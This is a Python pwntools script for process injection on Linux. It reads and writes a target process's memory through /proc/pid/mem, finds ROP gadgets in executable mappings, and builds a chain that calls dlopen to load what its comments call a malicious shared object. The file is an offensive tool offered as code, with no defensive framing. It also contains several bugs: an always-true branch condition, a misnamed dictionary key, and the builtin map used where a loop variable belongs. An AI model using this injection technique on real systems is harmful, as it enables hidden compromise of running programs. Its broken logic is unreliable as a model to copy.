from os import RTLD_LAZY
from pwn import *

PAGE_SIZE = 4096

# memory related and relevant procfs virtual files
PROC_MAPS = "/proc/{}/maps"
PROC_MEM = "/proc/{}/mem"
PROC_SYSCALL = "/proc/{}/syscall"

# gadgets

nop = b"\x90\xc3"  # nop; ret;
jmp_rax = b"\xff\xe0"  # jmp rax;
pop_rsi = b"\x5e\xc3"  # pop rsi; ret;
pop_rdi = b"\x5f\xc3"  # pop rdi; ret;
pop_rax = b"\x58\xc3"  # pop rax; ret;
mov_rax_rsi = b"\x48\x89\xf0\xc3"  # mov rax, rsi; ret;

GADGET_LIST = {
    "nop": nop,
    "jmp_rax": jmp_rax,
    "pop_rsi": pop_rsi,
    "pop_rdi": pop_rdi,
    "pop_rax": pop_rax,
    "mov_rax_rsi": mov_rax_rsi
}


def read_memory(pid: int, address: int, num_bytes: int):
    """
    :param pid: id of the target process
    :param address: virtual address to read from
    :param num_bytes: amount of bytes to read from
    :return: read bytes
    """
    with open(PROC_MEM.format(pid), 'rb') as mem_file:
        mem_file.seek(address)
        return mem_file.read(num_bytes)


def write_memory(pid: int, address: int, content: bytes):
    """
    :param pid: id of the target process
    :param address: virtual address to write to
    :param content: what to write
    :return: void
    """
    with open(PROC_MEM.format(pid), 'wb') as mem_file:
        mem_file.seek(address)
        mem_file.write(content)


def parse_maps_entry(mapped_entry: str) -> dict:
    """
    :param mapped_entry: a line parsed from /proc/pid/maps that includes a mapped memory entry
    :return: a parsed memory entry (dict)
    """
    parsed = {}
    split_entry = mapped_entry.split(" ")
    parsed['name'] = split_entry[-1]
    addresses = split_entry[0].split("-")
    parsed['start'] = addresses[0]
    parsed['end'] = addresses[1]
    parsed['perms'] = split_entry[1]
    return parsed


def parse_maps(pid: int) -> dict:
    """
    :param pid: id of the target process
    :return: parsed dict of the relevant (stack / exec) mapped memory entries
    """
    final = {}
    binaries = []
    base_addrs = []
    bss_addrs = []
    with open(PROC_MAPS.format(pid), "r") as file:
        maps_data = file.read().split("\n")[:-1]
    for entry in maps_data:
        if "[stack]" in entry:
            final["stack"] = parse_maps_entry(entry)
        elif "r-xp" in entry:
            binaries.append(parse_maps_entry(entry))
        elif "r--p" in entry:
            base_addrs.append(parse_maps_entry(entry))
        elif "rw-p":
            (bss_addrs.append(parse_maps_entry(entry)))
    final["bin"] = binaries
    final["base_addr"] = base_addrs
    final["bss_addr"] = bss_addrs
    return final


def get_entry_size(maps_entry: dict) -> int:
    """
    :param maps_entry: dict
    :return: the size of the mapped memory
    """
    map_start = "0x" + maps_entry["start"]
    map_end = "0x" + maps_entry["end"]
    map_size = int(map_end, 16) - int(map_start, 16)
    return map_size


def find_gadget(pid: int, maps_entry: dict, gadget: bytes) -> int:
    """
    :param pid: id of the target process
    :param maps_entry: dict representing a parsed memory mapping
    :param gadget: signature (assembled instructions) of the gadget
    :return: the desired gadget's address in mapped executable memory, or -1 if not found
    """
    map_size = get_entry_size(maps_entry)
    start = int(maps_entry["start"], 16)  # Convert start address to integer

    try:
        mapped_memory = read_memory(pid, start, map_size)
    except Exception as e:
        print(f"[-] error reading memory: {e}")
        return -1

    offset = mapped_memory.find(gadget)
    if offset != -1:
        gadget_addr = offset + start
        log.info(f"found gadget at: {hex(gadget_addr)}")
        return gadget_addr
    else:
        print(f"[-] gadget not found in memory region starting at: {hex(start)}")
        return -1


def locate_dlopen(pid: int, libc_base: int) -> int:
    """
    :param pid: id of the target process
    :param libc_base: base address of libc in the target process
    :return: the final address of dlopen in the target process
    """
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

    libc.address = libc_base

    dlopen_addr = libc.symbols["dlopen"]

    log.info(f"libc base: {hex(libc_base)}")
    log.info(f"dlopen offset in libc: {hex(dlopen_addr)}")

    return dlopen_addr

def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
    """
    :param pid: id of the target process
    :param address: target address
    :param so_path: the path to the malicious so
    :param maps: a parsed proc maps dict
    :return: the ROP chain
    """

    for gadget in GADGET_LIST.keys():
        log.info(f"finding: {gadget}")
        for binary in maps["bin"]:
            gadget_addr = find_gadget(pid=pid, maps_entry=binary, gadget=GADGET_LIST[gadget])
            if gadget_addr != -1:  # Ensure valid gadget address
                if gadget == "return_addr":
                    address = address + 2
                log.success("found! => " + str(hex(gadget_addr)))
                GADGET_LIST[gadget] = gadget_addr.to_bytes(8, byteorder="little")
                break
            else:
                print(f"[-] invalid gadget address for {gadget}, skipping...")
                continue

    # Find dlopen in libc
    for base_addr in maps["base_addrs"]:
        if 'libc.so.6' in map["name"]:
            libc_base = int(map["start"], 16)  # Convert libc base address to integer
            dlopen_addr = locate_dlopen(pid=pid, libc_base=libc_base)  # Pass integer libc_base
            break
    else:
        print("[-] didn't find dlopen's address...")
        exit(1)

    rop_chain = (
        GADGET_LIST["pop_rax"] +
        p64(dlopen_addr) +
        GADGET_LIST["pop_rdi"] +
        p64(address + 0x46) +
        GADGET_LIST["pop_rsi"] +
        p64(RTLD_LAZY) +
        GADGET_LIST["jmp_rax"] +
        so_path.encode()
    )

    return rop_chain

class SyscallInfo:
    def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
        self.syscall_num = syscall_num
        self.rdi = rdi
        self.rsi = rsi
        self.rdx = rdx
        self.r10 = r10
        self.r8 = r8
        self.r9 = r9
        self.rsp = rsp
        self.rip = rip

    def __repr__(self):
        return (
            f"SyscallInfo(\n"
            f"  syscall_num={hex(self.syscall_num)},\n"
            f"  rdi={hex(self.rdi)},\n"
            f"  rsi={hex(self.rsi)},\n"
            f"  rdx={hex(self.rdx)},\n"
            f"  r10={hex(self.r10)},\n"
            f"  r8={hex(self.r8)},\n"
            f"  r9={hex(self.r9)},\n"
            f"  rsp={hex(self.rsp)},\n"
            f"  rip={hex(self.rip)}\n"
            f")"
        )


def parse_proc_syscall(pid):
    syscall_file = f'/proc/{pid}/syscall'

    try:
        with open(syscall_file, 'r') as f:
            content = f.read().strip()

        values = content.split()

        syscall_num = int(values[0], 16)
        rdi = int(values[1], 16)
        rsi = int(values[2], 16)
        rdx = int(values[3], 16)
        r10 = int(values[4], 16)
        r8 = int(values[5], 16)
        r9 = int(values[6], 16)
        rsp = int(values[7], 16)
        rip = int(values[8], 16)

        return SyscallInfo(syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip)

    except FileNotFoundError:
        log.error(f"/proc/{pid}/syscall not found")
        return None
    except Exception as e:
        log.error(f"Error parsing syscall file: {e}")
        return None
